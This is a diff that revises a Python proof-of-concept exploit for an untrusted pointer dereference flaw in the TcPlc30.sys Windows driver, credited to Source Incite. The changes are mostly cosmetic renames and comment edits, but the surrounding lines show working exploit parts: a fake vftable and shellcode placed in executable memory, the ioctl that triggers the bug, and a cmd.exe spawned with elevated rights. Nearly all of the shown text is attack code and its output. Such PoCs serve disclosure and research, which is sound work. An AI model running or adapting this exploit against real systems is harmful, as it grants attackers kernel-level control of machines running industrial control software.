@@ -129,7 +129,7 @@ c:\Users\Guest\Desktop>poc.py
 [+] TcPlc30.sys Untrusted Pointer Dereference EoP vulnerability
 [+] Steven Seeley (mr_me) of Source Incite
 [+] allocating input buffer
-[+] allocating input buffer
+[+] allocating output buffer
 [+] sending ioctl
 Microsoft Windows [Version 6.1.7601]
 Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
@@ -155,17 +155,17 @@ MEM_RESERVE = 0x00002000
 PAGE_EXECUTE_READWRITE = 0x00000040
 STATUS_SUCCESS = 0
  
-def alloc(base, input_size):
-    print "[+] allocating input buffer"
+def alloc(base, input_size, type):
+    print "[+] allocating %s buffer" % type
     baseadd   = c_int(base)
     size = c_int(input_size)
     input  = struct.pack("<I", base + 0x04)      # fake vftable
     input += "\x44" * 0x8
-    input += struct.pack("<I", base + 0x0c)      # pointer to our data to pivot to for win10 (need to disable SMEP)
+    input += struct.pack("<I", base + 0x0c)      # pointer to our code
     input += "\x44" * 0x8
     input += struct.pack("<I", 0xc0dedbad)       # eip for TcIo.sys, TcNc.sys and TcRTime.sys
     input += "\x44" * 0x14
-    input += struct.pack("<I", base + 0x34)      # eip everything else
+    input += struct.pack("<I", base + 0x34)      # eip for everything else
 
     # --[ setup]
     input += "\x60"                      # pushad
@@ -257,8 +257,8 @@ if __name__ == '__main__':
     inputbuffer_size  = 0x1000
     outputbuffer_size = 0x1000
     outputbuffer      = 0x20000000
-    alloc(inputbuffer, inputbuffer_size)
-    alloc(outputbuffer, outputbuffer_size) 
+    alloc(inputbuffer, inputbuffer_size, "input")
+    alloc(outputbuffer, outputbuffer_size, "output") 
     IoStatusBlock = c_ulong()
     if driver_handle:
         print "[+] sending ioctl"
@@ -271,6 +271,5 @@ if __name__ == '__main__':
                                        inputbuffer,
                                        inputbuffer_size,
                                        outputbuffer,
-                                       outputbuffer_size
-                                       )
+                                       outputbuffer_size)
         system("cmd.exe")
